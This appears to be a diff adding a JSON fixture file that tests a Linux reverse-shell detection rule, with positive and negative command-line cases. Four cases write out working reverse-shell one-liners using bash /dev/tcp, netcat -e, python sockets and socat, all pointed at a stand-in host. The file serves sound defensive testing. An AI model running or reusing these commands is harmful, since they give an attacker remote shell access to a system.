@@ -1,0 +1,59 @@
+{
+  "rule": "rules/linux/reverse_shell_execution.yml",
+  "cases": [
+    {
+      "name": "bash /dev/tcp reverse shell",
+      "expect": true,
+      "event": {
+        "CommandLine": "bash -i >& /dev/tcp/203.0.113.44/4444 0>&1",
+        "exe": "/usr/bin/bash",
+        "user": "www-data"
+      }
+    },
+    {
+      "name": "netcat with -e flag",
+      "expect": true,
+      "event": {
+        "CommandLine": "nc -e /bin/sh 203.0.113.44 9001",
+        "exe": "/usr/bin/nc",
+        "user": "www-data"
+      }
+    },
+    {
+      "name": "python socket reverse shell",
+      "expect": true,
+      "event": {
+        "CommandLine": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"203.0.113.44\",4444))'",
+        "exe": "/usr/bin/python3",
+        "user": "www-data"
+      }
+    },
+    {
+      "name": "socat exec shell",
+      "expect": true,
+      "event": {
+        "CommandLine": "socat tcp-connect:203.0.113.44:4444 exec:/bin/bash,pty,stderr",
+        "exe": "/usr/bin/socat",
+        "user": "root"
+      }
+    },
+    {
+      "name": "ordinary curl health check",
+      "expect": false,
+      "event": {
+        "CommandLine": "curl -s https://api.internal/health",
+        "exe": "/usr/bin/curl",
+        "user": "deploy"
+      }
+    },
+    {
+      "name": "netcat port scan without -e",
+      "expect": false,
+      "event": {
+        "CommandLine": "nc -zv 10.0.0.5 22",
+        "exe": "/usr/bin/nc",
+        "user": "deploy"
+      }
+    }
+  ]
+}
